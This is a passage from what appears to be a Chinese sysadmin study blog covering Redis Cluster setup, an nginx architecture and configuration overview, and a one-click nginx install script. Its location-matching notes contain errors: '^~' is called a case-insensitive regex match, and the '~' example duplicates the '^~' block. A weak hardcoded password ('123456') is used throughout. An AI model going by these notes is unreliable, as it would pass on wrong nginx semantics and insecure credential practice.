10.0.0.132:6379 10.0.0.128:6379 10.0.0.129:6379 10.0.0.132:6380 10.0.0.128:6380 10.0.0.129:6380 --cluster-replicas 1<br><br><span class="hljs-comment">##redis cluster方式连接</span><br>redis-cli -a 123456 -c <br>[root@rocky data]<span class="hljs-comment">#redis-cli -a 123456 -c </span><br>Warning: Using a password with <span class="hljs-string">&#x27;-a&#x27;</span> or <span class="hljs-string">&#x27;-u&#x27;</span> option on the <span class="hljs-built_in">command</span> line interface may not be safe.<br><br>127.0.0.1:6379&gt; <span class="hljs-built_in">set</span> key1 v1<br>-&gt; Redirected to slot [9189] located at 10.0.0.128:6379<br>OK<br><br>10.0.0.128:6379&gt; get key1<br><span class="hljs-string">&quot;v1&quot;</span><br></code></pre></td></tr></table></figure><p>python：添加一万个key-value值到里面，添加一万条记录</p><p>注意：程序连接的地址一定是IP地址+端口，所有节点包括主从节点都要写上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#python3环境，以及cluster链接模块</span><br>yum -y install python3<br><br>pip3 install redis-py-cluster<br><br><span class="hljs-comment">##跑一下python添加数据脚本</span><br><span class="hljs-comment">#!/usr/bin/env python3</span><br>from rediscluster  import RedisCluster<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    startup_nodes = [<br>        &#123;<span class="hljs-string">&quot;host&quot;</span>:<span class="hljs-string">&quot;10.0.0.132&quot;</span>, <span class="hljs-string">&quot;port&quot;</span>:6379&#125;,<br>        &#123;<span class="hljs-string">&quot;host&quot;</span>:<span class="hljs-string">&quot;10.0.0.128&quot;</span>, <span class="hljs-string">&quot;port&quot;</span>:6379&#125;,<br>        &#123;<span class="hljs-string">&quot;host&quot;</span>:<span class="hljs-string">&quot;10.0.0.129&quot;</span>, <span class="hljs-string">&quot;port&quot;</span>:6379&#125;,<br>        &#123;<span class="hljs-string">&quot;host&quot;</span>:<span class="hljs-string">&quot;10.0.0.132&quot;</span>, <span class="hljs-string">&quot;port&quot;</span>:6380&#125;,<br>        &#123;<span class="hljs-string">&quot;host&quot;</span>:<span class="hljs-string">&quot;10.0.0.128&quot;</span>, <span class="hljs-string">&quot;port&quot;</span>:6380&#125;,<br>        &#123;<span class="hljs-string">&quot;host&quot;</span>:<span class="hljs-string">&quot;10.0.0.129&quot;</span>, <span class="hljs-string">&quot;port&quot;</span>:6380&#125;]<br>    try:<br>        redis_conn= RedisCluster(startup_nodes=startup_nodes,password=<span class="hljs-string">&#x27;123456&#x27;</span>, decode_responses=True)<br>    except Exception as e:<br>        <span class="hljs-built_in">print</span>(e)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0, 10000):<br>        redis_conn.set(<span class="hljs-string">&#x27;key&#x27;</span>+str(i),<span class="hljs-string">&#x27;value&#x27;</span>+str(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;key&#x27;</span>+str(i)+<span class="hljs-string">&#x27;:&#x27;</span>,redis_conn.get(<span class="hljs-string">&#x27;key&#x27;</span>+str(i)))<br><br>-c集群模式写入<br>[root@rocky script]<span class="hljs-comment">#redis-cli -a 123456 -c</span><br>Warning: Using a password with <span class="hljs-string">&#x27;-a&#x27;</span> or <span class="hljs-string">&#x27;-u&#x27;</span> option on the <span class="hljs-built_in">command</span> line interface may not be safe.<br>127.0.0.1:6379&gt; get key111<br>-&gt; Redirected to slot [13680] located at 10.0.0.129:6379<br><span class="hljs-string">&quot;value111&quot;</span><br></code></pre></td></tr></table></figure><h1 id="redis-cluster使用的局限性"><a href="#redis-cluster使用的局限性" class="headerlink" title="redis-cluster使用的局限性"></a>redis-cluster使用的局限性</h1><p>集群的优点：</p><p>1.多个master读写，解决了单点故障，写性能得到比较好的提升</p><p>2.有从节点作为备份</p><p>集群的缺点：</p><p>1.成本高，机器多，维护比较麻烦</p><p>2.不支持读写分离，因为从节点不提供读功能，从节点只能同步主节点的数据</p><p>3.客户端链接的时候，还是得找一下槽位，导致响应可能会慢</p><p>4.有些命令例如mget，keys *等遍历所有库的，不方便</p><p>5.集群cluster会和sentinel哨兵冲突，建议选择一个即可，一般来说哨兵+主从足以，一个项目一套，不要混用redis即可</p><p>像磐石系统：直接使用的哨兵来实现，1主2从，加上哨兵做高可用即可</p><h1 id="2-LVS常用模型工作原理，及实现。"><a href="#2-LVS常用模型工作原理，及实现。" class="headerlink" title="2. LVS常用模型工作原理，及实现。"></a>2. LVS常用模型工作原理，及实现。</h1><h1 id="3-LVS的负载策略有哪些，各应用在什么场景，通过LVS-DR任意实现1-2种场景。"><a href="#3-LVS的负载策略有哪些，各应用在什么场景，通过LVS-DR任意实现1-2种场景。" class="headerlink" title="3. LVS的负载策略有哪些，各应用在什么场景，通过LVS DR任意实现1-2种场景。"></a>3. LVS的负载策略有哪些，各应用在什么场景，通过LVS DR任意实现1-2种场景。</h1><h1 id="4-web-http协议通信过程，相关技术术语总结。"><a href="#4-web-http协议通信过程，相关技术术语总结。" class="headerlink" title="4. web http协议通信过程，相关技术术语总结。"></a>4. web http协议通信过程，相关技术术语总结。</h1><p><img src="2792175-20221210172436480-1497231092.png" alt="img"></p><h2 id="技术术语"><a href="#技术术语" class="headerlink" title="技术术语"></a>技术术语</h2><p>http：应用层协议，端口80</p><p>web前端开发语言：h5，js，css</p><p>mime.type：可识别的后缀，文件格式，Nginx内的mime.type就是可识别执行的后缀</p><p>URL：服务器资源路径位置</p><h1 id="5-总结网络IO模型和nginx架构。"><a href="#5-总结网络IO模型和nginx架构。" class="headerlink" title="5. 总结网络IO模型和nginx架构。"></a>5. 总结网络IO模型和nginx架构。</h1><h2 id="nginx的基本功能"><a href="#nginx的基本功能" class="headerlink" title="nginx的基本功能"></a>nginx的基本功能</h2><p>nginx只能处理静态文件图片等，想要实现动态资源可以依赖于PHP等程序来实现</p><ul><li>静态的web资源服务器html，图片，js，css，txt等静态资源</li><li>http/https协议的反向代理，代理后端业务服务器的业务端口</li><li>结合FastCGI/uWSGI/SCGI等协议反向代理动态资源请求</li><li>tcp/udp协议的请求转发（反向代理）</li><li>imap4/pop3协议的反向代理，邮件服务器反向代理</li></ul><p>nginx的并发性很高很强，master管理worker进程，worker进程由master进程和nginx.conf配置文件控制个数（worker_connection等，worker_processes）</p><p>Apache的工作进程：多个子进程，多个线程来处理用户请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master conf]<span class="hljs-comment">#pstree -p | grep httpd</span><br>           |-httpd(1112)-+-httpd(37066)<br>           |             |-httpd(37067)<br>           |             |-httpd(37068)<br>           |             |-httpd(37069)<br>           |             `-httpd(37102)<br><br>[root@master conf]<span class="hljs-comment">#pstree -p | grep nginx</span><br>           |-nginx(51078)-+-nginx(53849)<br>           |              `-nginx(53850)<br></code></pre></td></tr></table></figure><h2 id="nginx的工作进程"><a href="#nginx的工作进程" class="headerlink" title="nginx的工作进程"></a>nginx的工作进程</h2><p>一个master进程，多个worker子进程，master进程分发工作任务到子进程，分配一个worker进程处理这个访问请求</p><p>master进程负责接受请求，worker进程负责实际的处理工作</p><p><img src="2792175-20221210172436833-2041614815.png" alt="img"></p><h1 id="6-nginx总结核心配置和优化。"><a href="#6-nginx总结核心配置和优化。" class="headerlink" title="6. nginx总结核心配置和优化。"></a>6. nginx总结核心配置和优化。</h1><p>nginx 有多种模块</p><p>核心模块：是 Nginx 服务器正常运行必不可少的模块，提供错误日志记录（access.log，errer.log） 、配置文件解析 、事件驱动机制 、进程管理等核心功能</p><p>标准HTTP模块：提供 HTTP 协议解析相关的功能，比如： 虚拟主机（server） 、 网页编码设置 、 HTTP响应头设置 （header）等等</p><p>可选HTTP模块：主要用于扩展标准的 HTTP 功能，让 Nginx 能处理一些特殊的服务，比如： Flash多媒体传输 、解析 GeoIP 请求、 网络传输压缩 、 安全协议 SSL 支持（SSL模块）、压缩gzip等</p><p>邮件服务模块：主要用于支持 Nginx 的 邮件服务 ，包括对 POP3 协议、 IMAP 协议和 SMTP协议的支持</p><p>Stream服务模块: 实现反向代理功能,包括TCP协议代理第三方模块：是为了扩展 Nginx 服务器应用，完成开发者自定义功能，比如： Json 支持、 Lua 支持等（upstream模块），可代理传统的http服务，代理TCP服务，代理TCP端口</p><p><img src="2792175-20221210172437271-355933299.png" alt="img"></p><h2 id="Nginx核心配置"><a href="#Nginx核心配置" class="headerlink" title="Nginx核心配置"></a>Nginx核心配置</h2><p>server模块</p><p>依赖于http_core核心模块</p><p>核心站点配置模块，可以配置多个站点</p><p>在主nginx.conf下添加两个别的站点的配置文件，可以写为include</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">http&#123;<br><br>error_log /apps/nginx/logs/error.log; <span class="hljs-comment">##定义错误日志位置</span><br><br>server &#123;<br>        listen       8081; <span class="hljs-comment">##监听主机端口</span><br>        server_name  localhost; <span class="hljs-comment">##配置域名，类似IIS的配置监听，支持通配符，比如*.ctfmall.com</span><br><br>        <span class="hljs-comment">#charset koi8-r;</span><br><br>        <span class="hljs-comment">#access_log  logs/host.access.log  main;</span><br><br>        location / &#123;<br>            root   html; <span class="hljs-comment">##相对路径，指的是/apps/nginx下面的</span><br>            index  index.html index.htm;<br>        &#125;<br><br>        <span class="hljs-comment">#error_page  404              /404.html;</span><br><br>        <span class="hljs-comment"># redirect server error pages to the static page /50x.html</span><br>        <span class="hljs-comment">#</span><br>        error_page   500 502 503 504  /50x.html; <span class="hljs-comment">##服务端的配置，报错页面</span><br>        location = /50x.html &#123;<br>            root   html;<br>        &#125;<br>&#125;<br><br>include /apps/nginx/conf/conf.d/*.conf; <span class="hljs-comment">##要写通配符，*.conf，include后面是文件</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="location模块的写法"><a href="#location模块的写法" class="headerlink" title="location模块的写法"></a>location模块的写法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">location模块写法<br><span class="hljs-comment">##location匹配规则写法</span><br><br><span class="hljs-comment">#语法规则：</span><br>location [ = | ~ | ~* | ^~ ] uri &#123; ... &#125;<br>= <span class="hljs-comment">#用于标准uri前，需要请求字串与uri精确匹配，大小写敏感,如果匹配成功就停止向下匹配并立即处理请求</span><br>^~ <span class="hljs-comment">#用于标准uri前，表示包含正则表达式,并且匹配以指定的正则表达式开头,对uri的最左边部分做匹配检查，不区分字符大小写</span><br>~ <span class="hljs-comment">#用于标准uri前，表示包含正则表达式,并且区分大小写</span><br>~* <span class="hljs-comment">#用于标准uri前，表示包含正则表达式,并且不区分大写不带符号 #匹配起始于此uri的所有的uri</span><br>\ <span class="hljs-comment">#用于标准uri前，表示包含正则表达式并且转义字符。可以将 . * ?等转义为普通符号</span><br><br><span class="hljs-comment">#匹配优先级从高到低：</span><br>=, ^~, ~/~*, 不带符号<br><br>=:精确匹配，必须是/about，区分大小写<br>location = /about &#123;<br>                <span class="hljs-built_in">alias</span> /opt/html/about; <br>        &#125;<br><br>^~:模糊匹配，是以/about开头即可，不区分大小写<br>location ^~ /about &#123;<br>                <span class="hljs-built_in">alias</span> /opt/html/about; <br>        &#125;<br><br>~:包含，只要包含about即可，区分大小写<br>location ^~ /about &#123;<br>                <span class="hljs-built_in">alias</span> /opt/html/about; <br>        &#125;<br><br><span class="hljs-comment">##其实最终表现为还是区分大小写，使用~的情况最多</span><br><br>~*:包含，只要包含about即可，不区分大小写<br>location ~* /about &#123;<br>                <span class="hljs-built_in">alias</span> /opt/html/about; <br>        &#125;<br><br><span class="hljs-comment">#以这些后缀结尾的，\.表示单一个字符，动静分离，不同服务器处理不同的请求</span><br>location ~* \.(gif|jpg|jpeg)$  &#123;<br>                <span class="hljs-built_in">alias</span> /opt/html/about; <br>        &#125;<br><br>location ~* \.(gif|jpg|jpeg)$  &#123;<br>                root /apps/nginx/static;<br>              index index.html;<br>        &#125;<br></code></pre></td></tr></table></figure><h2 id="nginx的优化"><a href="#nginx的优化" class="headerlink" title="nginx的优化"></a>nginx的优化</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##优化</span><br>开启gzip压缩页面<br>防盗链优化referer，限制前一个域名跳转<br>做反向代理，proxy_pass开启cache缓存，访问到Nginx的缓存上，nginx前端的图片做缓存<br>upstream开启ip_hash或者基于URL访问---&gt;解决用户客户端session不统一，会话老是负载到别的机器上的问题<br>SSL加密传输访问，可实现443转发到8080端口，80强制跳转443，使用rewrite模块<br>防盗链：只限于从某个链接跳转过来，其他都拒绝<br><br><span class="hljs-comment">##进程</span><br>加大worker进程数，worker_processes，建议和CPU核数一致（VCPU）<br>加大连接数connections，并发<br>worker进程数*connections=最大并发<br><br><span class="hljs-comment">##日志</span><br>XFF传到日志中，获取客户端的真实IP，后端WEB服务器，多级代理透传，实现获取真实IP<br></code></pre></td></tr></table></figure><h1 id="7-使用脚本完成一键编译安装nginx任意版本。"><a href="#7-使用脚本完成一键编译安装nginx任意版本。" class="headerlink" title="7. 使用脚本完成一键编译安装nginx任意版本。"></a>7. 使用脚本完成一键编译安装nginx任意版本。</h1><p>修改nginx_file的版本号，从网上直接下载nginx包</p><p>1.获取nginx包</p><p>2.解压到/usr/local/src下</p><p>3.创建user和group</p><p>4.安装依赖的开发包</p><p>5.对应nginx目录编译安装，指定路径，用户和组，需要编译安装的模块</p><p>6.指定nginx的sbin路径二进制执行程序环境变量</p><p>7.写service文件</p><p>8.开机自启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#********************************************************************</span><br><span class="hljs-comment">#Author:wangxiaochun</span><br><span class="hljs-comment">#QQ: 29308620</span><br><span class="hljs-comment">#Date: 2020-12-01</span><br><span class="hljs-comment">#FileName：install_nginx.sh</span><br><span class="hljs-comment">#URL: http://www.wangxiaochun.com</span><br><span class="hljs-comment">#Description：The test script</span><br><span class="hljs-comment">#Copyright (C): 2021 All rights reserved</span><br><span class="hljs-comment">#********************************************************************</span><br>SRC_DIR=/usr/local/src<br>NGINX_URL=http://nginx.org/download/<br>NGINX_FILE=nginx-1.20.2<br><span class="hljs-comment">#NGINX_FILE=nginx-1.18.0</span><br>TAR=.tar.gz<br>NGINX_INSTALL_DIR=/apps/nginx<br>CPUS=`lscpu |awk <span class="hljs-string">&#x27;/^CPU\(s\)/&#123;print $2&#125;&#x27;</span>`<br>. /etc/os-release<br><br><span class="hljs-function"><span class="hljs-title">color</span></span> () &#123;<br>    RES_COL=60<br>    MOVE_TO_COL=<span class="hljs-string">&quot;echo -en \\033[<span class="hljs-variable">$&#123;RES_COL&#125;</span>G&quot;</span><br>    SETCOLOR_SUCCESS=<span class="hljs-string">&quot;echo -en \\033[1;32m&quot;</span><br>    SETCOLOR_FAILURE=<span class="hljs-string">&quot;echo -en \\033[1;31m&quot;</span><br>    SETCOLOR_WARNING=<span class="hljs-string">&quot;echo -en \\033[1;33m&quot;</span><br>    SETCOLOR_NORMAL=<span class="hljs-string">&quot;echo -en \E[0m&quot;</span><br>    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> &amp;&amp; <span class="hljs-variable">$MOVE_TO_COL</span><br>    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;[&quot;</span><br>    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$2</span> = <span class="hljs-string">&quot;success&quot;</span> -o <span class="hljs-variable">$2</span> = <span class="hljs-string">&quot;0&quot;</span> ] ;<span class="hljs-keyword">then</span><br>        <span class="hljs-variable">$&#123;SETCOLOR_SUCCESS&#125;</span><br>        <span class="hljs-built_in">echo</span> -n $<span class="hljs-string">&quot;  OK  &quot;</span>    <br>    <span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$2</span> = <span class="hljs-string">&quot;failure&quot;</span> -o <span class="hljs-variable">$2</span> = <span class="hljs-string">&quot;1&quot;</span>  ] ;<span class="hljs-keyword">then</span> <br>        <span class="hljs-variable">$&#123;SETCOLOR_FAILURE&#125;</span><br>        <span class="hljs-built_in">echo</span> -n $<span class="hljs-string">&quot;FAILED&quot;</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-variable">$&#123;SETCOLOR_WARNING&#125;</span><br>        <span class="hljs-built_in">echo</span> -n $<span class="hljs-string">&quot;WARNING&quot;</span><br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-variable">$&#123;SETCOLOR_NORMAL&#125;</span><br>    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;]&quot;</span><br>    <span class="hljs-built_in">echo</span> <br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">os_type</span></span> () &#123;<br>   awk -F<span class="hljs-string">&#x27;[ &quot;]&#x27;</span> <span class="hljs-string">&#x27;/^NAME/&#123;print $2&#125;&#x27;</span> /etc/os-release<br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">os_version</span></span> () &#123;<br>   awk -F<span class="hljs-string">&#x27;&quot;&#x27;</span> <span class="hljs-string">&#x27;/^VERSION_ID/&#123;print $2&#125;&#x27;</span> /etc/os-release<br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">check</span></span> () &#123;<br>    [ -e <span class="hljs-variable">$&#123;NGINX_INSTALL_DIR&#125;</span> ] &amp;&amp; &#123; color <span class="hljs-string">&quot;nginx 已安装,请卸载后再安装&quot;</span> 1; <span class="hljs-built_in">exit</span>; &#125;<br>    <span class="hljs-built_in">cd</span>  <span class="hljs-variable">$&#123;SRC_DIR&#125;</span><br>    <span class="hljs-keyword">if</span> [  -e <span class="hljs-variable">$&#123;NGINX_FILE&#125;</span><span class="hljs-variable">$&#123;TAR&#125;</span> ];<span class="hljs-keyword">then</span><br>        color <span class="hljs-string">&quot;相关文件已准备好&quot;</span> 0<br>    <span class="hljs-keyword">else</span><br>        color <span class="hljs-string">&#x27;开始下载 nginx 源码包&#x27;</span> 0<br>        wget <span class="hljs-variable">$&#123;NGINX_URL&#125;</span><span class="hljs-variable">$&#123;NGINX_FILE&#125;</span><span class="hljs-variable">$&#123;TAR&#125;</span> <br>        [ $? -ne 0 ] &amp;&amp; &#123; color <span class="hljs-string">&quot;下载 <span class="hljs-variable">$&#123;NGINX_FILE&#125;</span><span class="hljs-variable">$&#123;TAR&#125;</span>文件失败&quot;</span> 1; <span class="hljs-built_in">exit</span>; &#125; <br>    <span class="hljs-keyword">fi</span><br>&#125; <br><br><span class="hljs-function"><span class="hljs-title">install</span></span> () &#123;<br>    color <span class="hljs-string">&quot;开始安装 nginx&quot;</span> 0<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">id</span> nginx  &amp;&gt; /dev/null;<span class="hljs-keyword">then</span><br>        color <span class="hljs-string">&quot;nginx 用户已存在&quot;</span> 1 <br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-comment">##-r，创建一样的组</span><br>        useradd -s /sbin/nologin -r  nginx<br>        color <span class="hljs-string">&quot;创建 nginx 用户&quot;</span> 0 <br>    <span class="hljs-keyword">fi</span><br>    color <span class="hljs-string">&quot;开始安装 nginx 依赖包&quot;</span> 0<br>    <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$ID</span> == <span class="hljs-string">&quot;centos&quot;</span> ] ;<span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$VERSION_ID</span> =~ ^7 ]];<span class="hljs-keyword">then</span><br>          <span class="hljs-comment">##c++编译包，pcre开发包，openssl，SSL证书编译包，zlib解压包</span><br>            yum -y -q  install make gcc pcre-devel openssl-devel zlib-devel perl-ExtUtils-Embed<br><span class="hljs-keyword">elif</span> [[ <span class="hljs-variable">$VERSION_ID</span> =~ ^8 ]];<span class="hljs-keyword">then</span><br>            yum -y -q install make gcc-c++ libtool pcre pcre-devel zlib zlib-devel openssl openssl-devel perl-ExtUtils-Embed <br><span class="hljs-keyword">else</span> <br>            color <span class="hljs-string">&#x27;不支持此系统!&#x27;</span>  1<br>            <span class="hljs-built_in">exit</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$ID</span> == <span class="hljs-string">&quot;rocky&quot;</span>  ];<span class="hljs-keyword">then</span><br>    yum -y -q install make gcc-c++ libtool pcre pcre-devel zlib zlib-devel openssl openssl-devel perl-ExtUtils-Embed <br><span class="hljs-keyword">else</span><br>        apt update &amp;&gt; /dev/null<br>        apt -y install make gcc libpcre3 libpcre3-dev openssl libssl-dev zlib1g-dev &amp;&gt; /dev/null<br>    <span class="hljs-keyword">fi</span><br><br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$SRC_DIR</span><br>    tar xf <span class="hljs-variable">$&#123;NGINX_FILE&#125;</span><span class="hljs-variable">$&#123;TAR&#125;</span><br>    NGINX_DIR=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;NGINX_FILE&#125;</span><span class="hljs-variable">$&#123;TAR&#125;</span>| sed -nr <span class="hljs-string">&#x27;s/^(.*[0-9]).*/\1/p&#x27;</span>`<br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$&#123;NGINX_DIR&#125;</span><br>    <span class="hljs-comment">##指定user，group，SSL加密模块，XFF模块，压缩模块，都是HTTP扩展模块，默认是安装标准模块，安装负载均衡upstream模块</span><br>    ./configure --prefix=<span class="hljs-variable">$&#123;NGINX_INSTALL_DIR&#125;</span> --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module <br>  <span class="hljs-comment">##编译安装</span><br>    make -j <span class="hljs-variable">$CPUS</span> &amp;&amp; make install <br>    [ $? -eq 0 ] &amp;&amp; color <span class="hljs-string">&quot;nginx 编译安装成功&quot;</span> 0 ||  &#123; color <span class="hljs-string">&quot;nginx 编译安装失败,退出!&quot;</span> 1 ;<span class="hljs-built_in">exit</span>; &#125;<br><br>    <span class="hljs-comment">##nginx发送到环境变量上</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PATH=<span class="hljs-variable">$&#123;NGINX_INSTALL_DIR&#125;</span>/sbin:<span class="hljs-variable">$&#123;PATH&#125;</span>&quot;</span> &gt; /etc/profile.d/nginx.sh<br>  <span class="hljs-built_in">source</span> /etc/profile.d/nginx.sh<br><br>    <span class="hljs-built_in">cat</span> &gt; /lib/systemd/system/nginx.service &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">[Unit]</span><br><span class="hljs-string">Description=The nginx HTTP and reverse proxy server</span><br><span class="hljs-string">After=network.target remote-fs.target nss-lookup.target</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Service]</span><br><span class="hljs-string">Type=forking</span><br><span class="hljs-string">PIDFile=$&#123;NGINX_INSTALL_DIR&#125;/logs/nginx.pid</span><br><span class="hljs-string">ExecStartPre=/bin/rm -f $&#123;NGINX_INSTALL_DIR&#125;/logs/nginx.pid</span><br><span class="hljs-string">ExecStartPre=$&#123;NGINX_INSTALL_DIR&#125;/sbin/nginx -t</span><br><span class="hljs-string">ExecStart=$&#123;NGINX_INSTALL_DIR&#125;/sbin/nginx</span><br><span class="hljs-string">ExecReload=/bin/kill -s HUP \$MAINPID</span><br><span class="hljs-string">KillSignal=SIGQUIT</span><br><span class="hljs-string">TimeoutStopSec=5</span><br><span class="hljs-string">KillMode=process</span><br><span class="hljs-string">PrivateTmp=true</span><br><span class="hljs-string">LimitNOFILE=100000</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Install]</span><br><span class="hljs-string">WantedBy=multi-user.target</span><br><span class="hljs-string">EOF</span><br>    systemctl 